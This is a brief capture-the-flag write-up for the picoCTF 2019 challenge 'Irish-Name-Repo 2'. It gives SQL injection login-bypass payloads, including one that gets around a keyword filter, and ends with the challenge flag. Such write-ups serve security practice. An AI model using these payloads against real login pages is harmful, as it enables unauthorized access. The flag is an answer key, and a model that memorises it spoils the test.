## Irish-Name-Repo 2 (350)

#### Description
> There is a website running at https://2019shell1.picoctf.com/problem/60775/ (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://2019shell1.picoctf.com:60775

#### Hint
> The password is being filtered.

#### Solution
Visit https://2019shell1.picoctf.com/problem/60775/login.html.
Login with this SQL injection like the Irish-Name-Repo 1:
```
Username: ' or 1=1 -- -
Password: anything
```
We will got the message: `SQLi detected.`
The server has filter keyword 'or'. But actually we don't need it.
```
Username: admin' -- -
Password: anything
```

#### Flag
`picoCTF{m0R3_SQL_plz_015815e2}`